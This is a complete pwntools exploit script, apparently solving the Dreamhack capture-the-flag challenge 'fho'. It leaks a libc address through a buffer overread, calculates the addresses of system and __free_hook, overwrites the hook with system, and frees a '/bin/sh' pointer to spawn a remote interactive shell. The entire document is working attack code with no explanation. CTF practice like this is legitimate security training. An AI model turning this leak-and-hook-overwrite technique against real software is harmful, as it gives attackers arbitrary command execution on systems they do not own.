from pwn import *
p=remote("host3.dreamhack.games",21418)
e=ELF("./fho")
libc=ELF("./libc-2.27.so")
def slog(name, addr): return success(': '.join([name, hex(addr)]))

buf=b"A"*0x48
p.recvuntil("Buf: ")
p.send(buf)
p.recvuntil(buf)
libc_start_main= u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main - (libc.symbols['__libc_start_main'] + 231)


system = libc_base + libc.symbols["system"]
free_hook = libc_base+ libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search(b"/bin/sh"))


p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(system))

p.recvuntil("To free: ")
p.sendline(str(binsh))
p.interactive()
